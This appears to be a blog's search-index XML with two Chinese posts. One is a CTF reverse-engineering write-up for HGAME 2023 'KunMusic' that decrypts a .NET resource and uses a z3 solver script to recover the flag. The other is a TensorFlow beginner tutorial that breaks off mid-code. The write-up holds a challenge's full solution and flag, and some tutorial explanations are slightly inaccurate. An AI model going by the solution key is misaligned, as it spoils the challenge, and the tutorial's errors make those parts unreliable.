<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>HGAME CTF 2023 RE——KunMusic</title>
    <link href="/2023/02/01/HGAME2023%20RE%20KunMusic/"/>
    <url>/2023/02/01/HGAME2023%20RE%20KunMusic/</url>
    
    <content type="html"><![CDATA[<h2 id="一些废话">一些废话</h2><p>看到网上相关与此题的题解挺少的，打算自己写一个解题过程，同时也可以在此题中学习到资源提取解密的方法，希望对新生能够有帮助？</p><h2 id="解题过程">解题过程</h2><p>我们拿到题目可以看到压缩包里一共有 3 个文件，一个json、一个exe、一个dll</p><p>我们先从能直观看到的json开始看</p><p><img src="https://s2.loli.net/2023/02/01/3UML6RWaYZFOxl5.png" alt=""></p><p>我们可以注意到关键的NET，因此合理判断此题是一个NET应用程序的逆向题目，对此我们可以准备ILSPY、dnSPY工具，需要注意的一下是我们程序为 64 位，在使用dnSPY时需要注意一下位数</p><p>我们将exe以及dll进行拖入可以发现exe没有什么信息，对于dll我们可以观察到一些操作</p><p><img src="https://s2.loli.net/2023/02/01/7ZEM1D5UGR3s9dQ.png" alt=""></p><p>在跳转后我们可以看到如下界面</p><p><img src="https://s2.loli.net/2023/02/01/CxnbfUFrvKyTEGM.png" alt=""></p><p>其似乎再对资源文件进行解密，我们可以尝试将其dump下来，手动进行异或后保存为一个新的文件</p><p><img src="https://s2.loli.net/2023/02/01/AR4G2yfU1gIrxjc.png" alt=""></p><p>选择直接保存，随后我们写一段脚本对其解密</p><p>之后我们再拿 010Editor 进行查看我们得到的文件，可以发现又是一个PE文件</p><p><img src="https://s2.loli.net/2023/02/01/PGcBu5m1kQxaISY.png" alt=""></p><p>我们将其再次拖入进反汇编程序我们可以看到在一个类中存在有一个对按键按下次数的统计，也有一个 music 将我们的每个按键的次数进行统计并输出一个text，我们合理怀疑是flag，对于多项式我们可以使用z3库进行求解</p><p><img src="https://s2.loli.net/2023/02/01/ISBNW9HnFwcXGZj.png" alt=""></p><p>解密脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *<br><br>c = [<span class="hljs-number">132</span>, <span class="hljs-number">47</span>, <span class="hljs-number">180</span>, <span class="hljs-number">7</span>, <span class="hljs-number">216</span>, <span class="hljs-number">45</span>, <span class="hljs-number">68</span>, <span class="hljs-number">6</span>, <span class="hljs-number">39</span>, <span class="hljs-number">246</span>, <span class="hljs-number">124</span>, <span class="hljs-number">2</span>, <span class="hljs-number">243</span>, <span class="hljs-number">137</span>, <span class="hljs-number">58</span>, <span class="hljs-number">172</span>, <span class="hljs-number">53</span>, <span class="hljs-number">200</span>, <span class="hljs-number">99</span>, <span class="hljs-number">91</span>, <span class="hljs-number">83</span>, <span class="hljs-number">13</span>, <span class="hljs-number">171</span>, <span class="hljs-number">80</span>, <span class="hljs-number">108</span>, <span class="hljs-number">235</span>, <span class="hljs-number">179</span>, <span class="hljs-number">58</span>, <span class="hljs-number">176</span>, <span class="hljs-number">28</span>, <span class="hljs-number">216</span>, <span class="hljs-number">36</span>, <span class="hljs-number">11</span>, <span class="hljs-number">80</span>, <span class="hljs-number">39</span>, <span class="hljs-number">162</span>, <span class="hljs-number">97</span>, <span class="hljs-number">58</span>, <span class="hljs-number">236</span>, <span class="hljs-number">130</span>, <span class="hljs-number">123</span>, <span class="hljs-number">176</span>, <span class="hljs-number">24</span>, <span class="hljs-number">212</span>, <span class="hljs-number">56</span>, <span class="hljs-number">89</span>, <span class="hljs-number">72</span>]<br><br>num = [BitVec(<span class="hljs-string">f&#x27;flag<span class="hljs-subst">&#123;i&#125;</span>&#x27;</span>,<span class="hljs-number">8</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">13</span>)]<br>s = Solver()<br><br>s.add(num[<span class="hljs-number">0</span>] + <span class="hljs-number">52296</span> + num[<span class="hljs-number">1</span>] - <span class="hljs-number">26211</span> + num[<span class="hljs-number">2</span>] - <span class="hljs-number">11754</span> + (num[<span class="hljs-number">3</span>] ^ <span class="hljs-number">0xA114</span>) + num[<span class="hljs-number">4</span>] * <span class="hljs-number">63747</span> + num[<span class="hljs-number">5</span>] - <span class="hljs-number">52714</span> + num[<span class="hljs-number">6</span>] - <span class="hljs-number">10512</span> + num[<span class="hljs-number">7</span>] * <span class="hljs-number">12972</span> + num[<span class="hljs-number">8</span>] + <span class="hljs-number">45505</span> + num[<span class="hljs-number">9</span>] - <span class="hljs-number">21713</span> + num[<span class="hljs-number">10</span>] - <span class="hljs-number">59122</span> + num[<span class="hljs-number">11</span>] - <span class="hljs-number">12840</span> + (num[<span class="hljs-number">12</span>] ^ <span class="hljs-number">0x525F</span>) == <span class="hljs-number">12702282</span> )<br>s.add( num[<span class="hljs-number">0</span>] - <span class="hljs-number">25228</span> + (num[<span class="hljs-number">1</span>] ^ <span class="hljs-number">0x50DB</span>) + (num[<span class="hljs-number">2</span>] ^ <span class="hljs-number">0x1FDE</span>) + num[<span class="hljs-number">3</span>] - <span class="hljs-number">65307</span> + num[<span class="hljs-number">4</span>] * <span class="hljs-number">30701</span> + num[<span class="hljs-number">5</span>] * <span class="hljs-number">47555</span> + num[<span class="hljs-number">6</span>] - <span class="hljs-number">2557</span> + (num[<span class="hljs-number">7</span>] ^ <span class="hljs-number">0xBF9F</span>) + num[<span class="hljs-number">8</span>] - <span class="hljs-number">7992</span> + (num[<span class="hljs-number">9</span>] ^ <span class="hljs-number">0xE079</span>) + (num[<span class="hljs-number">10</span>] ^ <span class="hljs-number">0xE052</span>) + num[<span class="hljs-number">11</span>] + <span class="hljs-number">13299</span> + num[<span class="hljs-number">12</span>] - <span class="hljs-number">50966</span> == <span class="hljs-number">9946829</span> )<br>s.add( num[<span class="hljs-number">0</span>] - <span class="hljs-number">64801</span> + num[<span class="hljs-number">1</span>] - <span class="hljs-number">60698</span> + num[<span class="hljs-number">2</span>] - <span class="hljs-number">40853</span> + num[<span class="hljs-number">3</span>] - <span class="hljs-number">54907</span> + num[<span class="hljs-number">4</span>] + <span class="hljs-number">29882</span> + (num[<span class="hljs-number">5</span>] ^ <span class="hljs-number">0x3506</span>) + (num[<span class="hljs-number">6</span>] ^ <span class="hljs-number">0x533E</span>) + num[<span class="hljs-number">7</span>] + <span class="hljs-number">47366</span> + num[<span class="hljs-number">8</span>] + <span class="hljs-number">41784</span> + (num[<span class="hljs-number">9</span>] ^ <span class="hljs-number">0xD1BA</span>) + num[<span class="hljs-number">10</span>] * <span class="hljs-number">58436</span> + num[<span class="hljs-number">11</span>] * <span class="hljs-number">15590</span> + num[<span class="hljs-number">12</span>] + <span class="hljs-number">58225</span> == <span class="hljs-number">2372055</span> )<br>s.add( num[<span class="hljs-number">0</span>] + <span class="hljs-number">61538</span> + num[<span class="hljs-number">1</span>] - <span class="hljs-number">17121</span> + num[<span class="hljs-number">2</span>] - <span class="hljs-number">58124</span> + num[<span class="hljs-number">3</span>] + <span class="hljs-number">8186</span> + num[<span class="hljs-number">4</span>] + <span class="hljs-number">21253</span> + num[<span class="hljs-number">5</span>] - <span class="hljs-number">38524</span> + num[<span class="hljs-number">6</span>] - <span class="hljs-number">48323</span> + num[<span class="hljs-number">7</span>] - <span class="hljs-number">20556</span> + num[<span class="hljs-number">8</span>] * <span class="hljs-number">56056</span> + num[<span class="hljs-number">9</span>] + <span class="hljs-number">18568</span> + num[<span class="hljs-number">10</span>] + <span class="hljs-number">12995</span> + (num[<span class="hljs-number">11</span>] ^ <span class="hljs-number">0x995C</span>) + num[<span class="hljs-number">12</span>] + <span class="hljs-number">25329</span> == <span class="hljs-number">6732474</span> )<br>s.add( num[<span class="hljs-number">0</span>] - <span class="hljs-number">42567</span> + num[<span class="hljs-number">1</span>] - <span class="hljs-number">17743</span> + num[<span class="hljs-number">2</span>] * <span class="hljs-number">47827</span> + num[<span class="hljs-number">3</span>] - <span class="hljs-number">10246</span> + (num[<span class="hljs-number">4</span>] ^ <span class="hljs-number">0x3F9C</span>) + num[<span class="hljs-number">5</span>] + <span class="hljs-number">39390</span> + num[<span class="hljs-number">6</span>] * <span class="hljs-number">11803</span> + num[<span class="hljs-number">7</span>] * <span class="hljs-number">60332</span> + (num[<span class="hljs-number">8</span>] ^ <span class="hljs-number">0x483B</span>) + (num[<span class="hljs-number">9</span>] ^ <span class="hljs-number">0x12BB</span>) + num[<span class="hljs-number">10</span>] - <span class="hljs-number">25636</span> + num[<span class="hljs-number">11</span>] - <span class="hljs-number">16780</span> + num[<span class="hljs-number">12</span>] - <span class="hljs-number">62345</span> == <span class="hljs-number">14020739</span> )<br>s.add( num[<span class="hljs-number">0</span>] - <span class="hljs-number">10968</span> + num[<span class="hljs-number">1</span>] - <span class="hljs-number">31780</span> + (num[<span class="hljs-number">2</span>] ^ <span class="hljs-number">0x7C71</span>) + num[<span class="hljs-number">3</span>] - <span class="hljs-number">61983</span> + num[<span class="hljs-number">4</span>] * <span class="hljs-number">31048</span> + num[<span class="hljs-number">5</span>] * <span class="hljs-number">20189</span> + num[<span class="hljs-number">6</span>] + <span class="hljs-number">12337</span> + num[<span class="hljs-number">7</span>] * <span class="hljs-number">25945</span> + (num[<span class="hljs-number">8</span>] ^ <span class="hljs-number">0x1B98</span>) + num[<span class="hljs-number">9</span>] - <span class="hljs-number">25369</span> + num[<span class="hljs-number">10</span>] - <span class="hljs-number">54893</span> + num[<span class="hljs-number">11</span>] * <span class="hljs-number">59949</span> + (num[<span class="hljs-number">12</span>] ^ <span class="hljs-number">0x3099</span>) == <span class="hljs-number">14434062</span> )<br>s.add( num[<span class="hljs-number">0</span>] + <span class="hljs-number">16689</span> + num[<span class="hljs-number">1</span>] - <span class="hljs-number">10279</span> + num[<span class="hljs-number">2</span>] - <span class="hljs-number">32918</span> + num[<span class="hljs-number">3</span>] - <span class="hljs-number">57155</span> + num[<span class="hljs-number">4</span>] * <span class="hljs-number">26571</span> + num[<span class="hljs-number">5</span>] * <span class="hljs-number">15086</span> + (num[<span class="hljs-number">6</span>] ^ <span class="hljs-number">0x59CA</span>) + (num[<span class="hljs-number">7</span>] ^ <span class="hljs-number">0x5B35</span>) + (num[<span class="hljs-number">8</span>] ^ <span class="hljs-number">0x3FFD</span>) + (num[<span class="hljs-number">9</span>] ^ <span class="hljs-number">0x5A85</span>) + num[<span class="hljs-number">10</span>] - <span class="hljs-number">40224</span> + num[<span class="hljs-number">11</span>] + <span class="hljs-number">31751</span> + num[<span class="hljs-number">12</span>] * <span class="hljs-number">8421</span> == <span class="hljs-number">7433598</span> )<br>s.add( num[<span class="hljs-number">0</span>] + <span class="hljs-number">28740</span> + num[<span class="hljs-number">1</span>] - <span class="hljs-number">64696</span> + num[<span class="hljs-number">2</span>] + <span class="hljs-number">60470</span> + num[<span class="hljs-number">3</span>] - <span class="hljs-number">14752</span> + (num[<span class="hljs-number">4</span>] ^ <span class="hljs-number">0x507</span>) + (num[<span class="hljs-number">5</span>] ^ <span class="hljs-number">0x89C8</span>) + num[<span class="hljs-number">6</span>] + <span class="hljs-number">49467</span> + num[<span class="hljs-number">7</span>] - <span class="hljs-number">33788</span> + num[<span class="hljs-number">8</span>] + <span class="hljs-number">20606</span> + (num[<span class="hljs-number">9</span>] ^ <span class="hljs-number">0xAF4A</span>) + num[<span class="hljs-number">10</span>] * <span class="hljs-number">19764</span> + num[<span class="hljs-number">11</span>] + <span class="hljs-number">48342</span> + num[<span class="hljs-number">12</span>] * <span class="hljs-number">56511</span> == <span class="hljs-number">7989404</span> )<br>s.add( (num[<span class="hljs-number">0</span>] ^ <span class="hljs-number">0x7132</span>) + num[<span class="hljs-number">1</span>] + <span class="hljs-number">23120</span> + num[<span class="hljs-number">2</span>] + <span class="hljs-number">22802</span> + num[<span class="hljs-number">3</span>] * <span class="hljs-number">31533</span> + (num[<span class="hljs-number">4</span>] ^ <span class="hljs-number">0x9977</span>) + num[<span class="hljs-number">5</span>] - <span class="hljs-number">48576</span> + (num[<span class="hljs-number">6</span>] ^ <span class="hljs-number">0x6F7E</span>) + num[<span class="hljs-number">7</span>] - <span class="hljs-number">43265</span> + num[<span class="hljs-number">8</span>] + <span class="hljs-number">22365</span> + num[<span class="hljs-number">9</span>] + <span class="hljs-number">61108</span> + num[<span class="hljs-number">10</span>] * <span class="hljs-number">2823</span> + num[<span class="hljs-number">11</span>] - <span class="hljs-number">30343</span> + num[<span class="hljs-number">12</span>] + <span class="hljs-number">14780</span> == <span class="hljs-number">3504803</span> )<br>s.add( num[<span class="hljs-number">0</span>] * <span class="hljs-number">22466</span> + (num[<span class="hljs-number">1</span>] ^ <span class="hljs-number">0xDABF</span>) + num[<span class="hljs-number">2</span>] - <span class="hljs-number">53658</span> + (num[<span class="hljs-number">3</span>] ^ <span class="hljs-number">0xB838</span>) + (num[<span class="hljs-number">4</span>] ^ <span class="hljs-number">0x30DF</span>) + num[<span class="hljs-number">5</span>] * <span class="hljs-number">59807</span> + num[<span class="hljs-number">6</span>] + <span class="hljs-number">46242</span> + num[<span class="hljs-number">7</span>] + <span class="hljs-number">3052</span> + (num[<span class="hljs-number">8</span>] ^ <span class="hljs-number">0x62BF</span>) + num[<span class="hljs-number">9</span>] + <span class="hljs-number">30202</span> + num[<span class="hljs-number">10</span>] * <span class="hljs-number">22698</span> + num[<span class="hljs-number">11</span>] + <span class="hljs-number">33480</span> + (num[<span class="hljs-number">12</span>] ^ <span class="hljs-number">0x4175</span>) == <span class="hljs-number">11003580</span> )<br>s.add( num[<span class="hljs-number">0</span>] * <span class="hljs-number">57492</span> + (num[<span class="hljs-number">1</span>] ^ <span class="hljs-number">0x346D</span>) + num[<span class="hljs-number">2</span>] - <span class="hljs-number">13941</span> + (num[<span class="hljs-number">3</span>] ^ <span class="hljs-number">0xBBDC</span>) + num[<span class="hljs-number">4</span>] * <span class="hljs-number">38310</span> + num[<span class="hljs-number">5</span>] + <span class="hljs-number">9884</span> + num[<span class="hljs-number">6</span>] - <span class="hljs-number">45500</span> + num[<span class="hljs-number">7</span>] - <span class="hljs-number">19233</span> + num[<span class="hljs-number">8</span>] + <span class="hljs-number">58274</span> + num[<span class="hljs-number">9</span>] + <span class="hljs-number">36175</span> + (num[<span class="hljs-number">10</span>] ^ <span class="hljs-number">0x4888</span>) + num[<span class="hljs-number">11</span>] * <span class="hljs-number">49694</span> + (num[<span class="hljs-number">12</span>] ^ <span class="hljs-number">0x2501</span>) == <span class="hljs-number">25546210</span> )<br>s.add( num[<span class="hljs-number">0</span>] - <span class="hljs-number">23355</span> + num[<span class="hljs-number">1</span>] * <span class="hljs-number">50164</span> + (num[<span class="hljs-number">2</span>] ^ <span class="hljs-number">0x873A</span>) + num[<span class="hljs-number">3</span>] + <span class="hljs-number">52703</span> + num[<span class="hljs-number">4</span>] + <span class="hljs-number">36245</span> + num[<span class="hljs-number">5</span>] * <span class="hljs-number">46648</span> + (num[<span class="hljs-number">6</span>] ^ <span class="hljs-number">0x12FA</span>) + (num[<span class="hljs-number">7</span>] ^ <span class="hljs-number">0xA376</span>) + num[<span class="hljs-number">8</span>] * <span class="hljs-number">27122</span> + (num[<span class="hljs-number">9</span>] ^ <span class="hljs-number">0xA44A</span>) + num[<span class="hljs-number">10</span>] * <span class="hljs-number">15676</span> + num[<span class="hljs-number">11</span>] - <span class="hljs-number">31863</span> + num[<span class="hljs-number">12</span>] + <span class="hljs-number">62510</span> == <span class="hljs-number">11333836</span> )<br>s.add( num[<span class="hljs-number">0</span>] * <span class="hljs-number">30523</span> + (num[<span class="hljs-number">1</span>] ^ <span class="hljs-number">0x1F36</span>) + num[<span class="hljs-number">2</span>] + <span class="hljs-number">39058</span> + num[<span class="hljs-number">3</span>] * <span class="hljs-number">57549</span> + (num[<span class="hljs-number">4</span>] ^ <span class="hljs-number">0xD0C0</span>) + num[<span class="hljs-number">5</span>] * <span class="hljs-number">4275</span> + num[<span class="hljs-number">6</span>] - <span class="hljs-number">48863</span> + (num[<span class="hljs-number">7</span>] ^ <span class="hljs-number">0xD88C</span>) + (num[<span class="hljs-number">8</span>] ^ <span class="hljs-number">0xA40</span>) + (num[<span class="hljs-number">9</span>] ^ <span class="hljs-number">0x3554</span>) + num[<span class="hljs-number">10</span>] + <span class="hljs-number">62231</span> + num[<span class="hljs-number">11</span>] + <span class="hljs-number">19456</span> + num[<span class="hljs-number">12</span>] - <span class="hljs-number">13195</span> == <span class="hljs-number">13863722</span>)<br><br>s.add(num[<span class="hljs-number">0</span>]==<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;h&#x27;</span>)^c[<span class="hljs-number">0</span>])<br>s.add(num[<span class="hljs-number">1</span>]==<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;g&#x27;</span>)^c[<span class="hljs-number">1</span>])<br>s.add(num[<span class="hljs-number">2</span>]==<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>)^c[<span class="hljs-number">2</span>])<br>s.add(num[<span class="hljs-number">3</span>]==<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;m&#x27;</span>)^c[<span class="hljs-number">3</span>])<br>s.add(num[<span class="hljs-number">4</span>]==<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;e&#x27;</span>)^c[<span class="hljs-number">4</span>])<br>s.add(num[<span class="hljs-number">5</span>]==<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;&#123;&#x27;</span>)^c[<span class="hljs-number">5</span>])<br><br>s.check()<br>m = s.model()<br><span class="hljs-built_in">print</span>(m)<br>key = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">13</span>):<br>    key.append(m[num[i]].as_long())<br><br>flag = [(c[i]^key[i%<span class="hljs-number">13</span>])%<span class="hljs-number">128</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(c))]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>(flag))<br><br><span class="hljs-comment"># b&#x27;hgame&#123;z3_1s_very_u5eful_1n_rever5e_engin3ering&#125;&#x27;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Reverse</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Tensorflow入门到入土(轻量版)</title>
    <link href="/2023/01/26/Tensorflow/"/>
    <url>/2023/01/26/Tensorflow/</url>
    
    <content type="html"><![CDATA[<h2 id="前言">前言</h2><p>本笔记算是对 北京大学 软件与微电子学院 曹健老师 的人工智能实践课程的总结与归纳，收录了课程中的一些函数以及思想方法，方便后来人学习</p><blockquote><p>学习视频链接：<a href="https://www.icourse163.org/learn/PKU-1002536002?tid=1462067447#/learn/announce">人工智能实践：Tensorflow笔记_中国大学MOOC(慕课)</a></p></blockquote><h2 id="Tensorflow-Numpy-部分函数基础入门">Tensorflow &amp; Numpy 部分函数基础入门</h2><h3 id="张量概念">张量概念</h3><table><thead><tr><th style="text-align:center">维数</th><th style="text-align:center">阶</th><th style="text-align:center">名字</th><th style="text-align:center">例子</th></tr></thead><tbody><tr><td style="text-align:center">0-D</td><td style="text-align:center">0</td><td style="text-align:center">标量 scalar</td><td style="text-align:center">s = 1 2 3</td></tr><tr><td style="text-align:center">1-D</td><td style="text-align:center">1</td><td style="text-align:center">向量 vector</td><td style="text-align:center">v = [1,2,3]</td></tr><tr><td style="text-align:center">2-D</td><td style="text-align:center">2</td><td style="text-align:center">矩阵 matrix</td><td style="text-align:center">m = [[1,2,3],[4,5,6],[7,8,9]]</td></tr><tr><td style="text-align:center">n-D</td><td style="text-align:center">n</td><td style="text-align:center">张量 tensor</td><td style="text-align:center">t = [[[ …]]] (有n个[])</td></tr></tbody></table><p>张量可以表示 0 阶到 n 阶数组 (列表)</p><h3 id="张量创建">张量创建</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> tensorflow <span class="hljs-keyword">as</span> tf<br><span class="hljs-comment"># 维度：</span><br><span class="hljs-comment"># 一维 直接写个数</span><br><span class="hljs-comment"># 二维 用 [行,列]</span><br><span class="hljs-comment"># 多维 用 [n,m,j,k...]</span><br><span class="hljs-comment"># 创建全为 0 的张量</span><br>tf.zeros(维度)<br><span class="hljs-comment"># 创建全为 1 的张量</span><br>tf.ones(维度)<br><span class="hljs-comment"># 创建全为指定值的张量</span><br>tf.fill(维度,指定值)<br></code></pre></td></tr></table></figure><h3 id="随机数生成">随机数生成</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> tensorflow <span class="hljs-keyword">as</span> tf<br><span class="hljs-comment"># 生成正太分布的随机数，默认均值为 0，标准差为 1</span><br>tf.random.normal(维度,mean=维度,stddev=标准差)<br><span class="hljs-comment"># 生成截断式正态分布的随机数 (生成的随机数更为集中)</span><br>tf.random.truncated_normal(维度,mean=维度,stddev=标准差)<br></code></pre></td></tr></table></figure><p>在<code>tf.truncated_normal</code>中如果随机生成数据的取值在（μ-2σ，μ+2σ）之则重新进行生成，保证了生成值在均值附近。<br>μ：均值 σ：标准差<br>$$<br>σ = \sqrt{\frac{\sum_{i=1}^n(x_i-\bar x)^2}{n}}<br>$$</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 生成均匀分布随机数 [min,max)</span><br>tf.random.uniform(维度,minval=最小值,maxval=最大值)<br><span class="hljs-comment"># 返回一个[0,1)之间的随机数</span><br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br>np.random.RandomState.rand(维度) <span class="hljs-comment"># 维度为空，返回标量</span><br><span class="hljs-comment"># 维度eg</span><br>rdm = np.random.RandomState(seed=<span class="hljs-number">1</span>)<br>a = rdm.rand() <span class="hljs-comment"># 返回一共随机标量</span><br>b = rdm.rand(<span class="hljs-number">2</span>,<span class="hljs-number">3</span>) <span class="hljs-comment"># 返回一共维度为 2 行 3 列的随机数矩阵</span><br></code></pre></td></tr></table></figure><h3 id="常用函数">常用函数</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 强制tensor转换为该数据类型</span><br>tf.cast(张量名,dtype=数据类型)<br><span class="hljs-comment"># 计算张量维度上元素的最小值</span><br>tf.reduce_min(张量名)<br><span class="hljs-comment"># 计算张量维度上元素的最大值</span><br>tf.reduce_max(张量名)<br></code></pre></td></tr></table></figure><h4 id="索引">索引</h4><p><strong>axis</strong> : axis 代表着在一共二维张量或者数组中，可以通过调整 axis 等于 0或者 1 控制执行维度，<code>axis=0</code>时代表跨行，即对列进行操作。当<code>axis=1</code>的时候代表跨列，即对列进行操作，如果不指定 axis 则所有元素参与计算</p><p><img src="https://s2.loli.net/2023/01/16/Q4cINnzEl2PMCDA.png" alt=""></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 计算张量沿着指定维度的平均值</span><br>tf.reduce_mean(张量名, axis=操作轴)<br><span class="hljs-comment"># 计算张量沿着指定维度的和</span><br>tf.reduce_sum(张量名, axis=操作轴)<br></code></pre></td></tr></table></figure><p>当我们需要返回沿着指定维度最大值或者最小值的索引使，我们可以使用如下函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">tf.argmax(张量名,axis=操作轴)<br>tf.argmin(张量名,axis=操作轴)<br><span class="hljs-comment"># 找到每一列最大值索引</span><br>tf.argmax(x,axis = <span class="hljs-number">0</span>)<br><span class="hljs-comment"># 找到每一行最大值索引</span><br>tf.argmax(x,axis = <span class="hljs-number">1</span>)<br><span class="hljs-comment"># 同理于最小值</span><br></code></pre></td></tr></table></figure><h4 id="将变量标记为”可训练“">将变量标记为”可训练“</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 将变量标记为可训练，被标记的变量会在反向传播中记录梯度信息，通常用该函数标记待训练参数</span><br>tf.Variable(初始值)<br></code></pre></td></tr></table></figure><h4 id="数学运算">数学运算</h4><p>需要注意维度相同的张量才可以做四则运算</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 四则运算</span><br>tf.add tf.subtract tf.multiply tf.divide<br><span class="hljs-comment"># 平方、次方与开方</span><br>tf.square tf.<span class="hljs-built_in">pow</span> tf.sqrt<br><span class="hljs-comment"># 矩阵乘</span><br>tf.matmul<br></code></pre></td></tr></table></figure><h4 id="将标签与张量进行配对构成数据集">将标签与张量进行配对构成数据集</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 切分传入张量的第一维度，生成输入特征/标签对，构建数据集</span><br>tf.data.Dataset.from_tensor_slices((输入特征,标签)) <span class="hljs-comment"># numpy和tensor格式都可以用该语句读入数据</span><br></code></pre></td></tr></table></figure><h4 id="某个函数对指定参数求导计算">某个函数对指定参数求导计算</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 一般结合with结构记录计算过程，gradient求出张量的梯度</span><br>tf.GradientTape()<br><span class="hljs-comment"># 一般采用如下方式计算</span><br><span class="hljs-keyword">with</span> tf.GradientTape() <span class="hljs-keyword">as</span> tape: <span class="hljs-comment"># 若干个计算过程</span><br>    grad = tape.gradient(函数,对谁求导)<br></code></pre></td></tr></table></figure><h4 id="枚举-enumerate">枚举 enumerate</h4><p>返回对应的索引以及元素通常在 for 循环中使用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># enumerate 是 Python 的内建函数，可以遍历每个元素</span><br><span class="hljs-built_in">enumerate</span>(列表名)<br><span class="hljs-comment"># eg:</span><br>seq = [<span class="hljs-string">&#x27;one&#x27;</span>, <span class="hljs-string">&#x27;two&#x27;</span>, <span class="hljs-string">&#x27;three&#x27;</span>]<br><span class="hljs-keyword">for</span> i, element <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(seq):<br>    <span class="hljs-built_in">print</span>(i, element)<br><span class="hljs-comment"># 输出</span><br><span class="hljs-number">0</span> one<br><span class="hljs-number">1</span> two<br><span class="hljs-number">2</span> three<br></code></pre></td></tr></table></figure><h4 id="标签">标签</h4><p>对于标签我们常用独热编码表示标签</p><blockquote><p>独热编码：在分类问题中常用独热码做标签，标记类别：1表示是，0表示非</p></blockquote><p>我们可以使用下面的函数，将待转换数据直接转换为独热码形式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 相当于取对应维度的张量来构成一个对应的张量，其下标使得对应的位置为 1 反之为 0</span><br>tf.one_hot(待转换数据,depth=几分类)<br><span 